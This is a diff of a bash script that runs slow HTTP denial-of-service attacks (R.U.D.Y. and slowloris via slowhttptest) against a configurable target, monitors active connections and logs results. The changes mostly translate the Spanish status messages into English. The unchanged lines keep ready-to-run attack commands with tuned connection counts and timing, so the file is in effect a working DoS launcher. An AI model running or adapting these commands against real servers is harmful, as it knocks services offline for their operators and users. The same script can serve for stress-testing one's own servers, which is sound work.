@@ -13,16 +13,16 @@ fi
 
 mkdir -p $OUTPUT_DIR
 
-echo "[+] INICIANDO ATAQUE R.U.D.Y.?"
+echo "[+] STARTING R.U.D.Y.? ATTACK"
 echo "Target: $TARGET"
-echo "Duración: $DURATION segundos"
-echo "Resultados: $OUTPUT_DIR"
+echo "Duration: $DURATION segundos"
+echo "Output dir: $OUTPUT_DIR"
 echo ""
 
 start_attack() {
     local name=$1
     local cmd=$2
-    echo "Iniciando $name..."
+    echo "Starting $name"
     $cmd > "$OUTPUT_DIR/${name}.log" 2>&1 &
     local pid=$!
     echo "$pid" > "$OUTPUT_DIR/${name}.pid"
@@ -35,17 +35,16 @@ start_attack "upload_rudy" "slowhttptest -c 700 -B -i 90 -r 120 -s 65536 -t POST
 start_attack "slowloris" "slowhttptest -c 600 -H -t GET -u ${TARGET}/form/ -x 15 -p 3 -l $DURATION"
 
 echo ""
-echo "[+] Ataque iniciado"
-echo "Monitoreando..."
+echo "[+] Attack started"
 
 # Monitoreo
 for i in {1..10}; do
-    echo "Tiempo: $(date)"
-    echo "Conexiones activas: $(netstat -an | grep 8000 | grep ESTABLISHED | wc -l)"
+    echo "Time: $(date)"
+    echo "Active connections: $(netstat -an | grep 8000 | grep ESTABLISHED | wc -l)"
     sleep 5
 done
 
-echo "Ataques en ejecución por $DURATION segundos..."
+echo "Attack duration: $DURATION seconds"
 wait
 
-echo "[+] ATAQUE FINALIZADO"
+echo "[+] FINISHED"
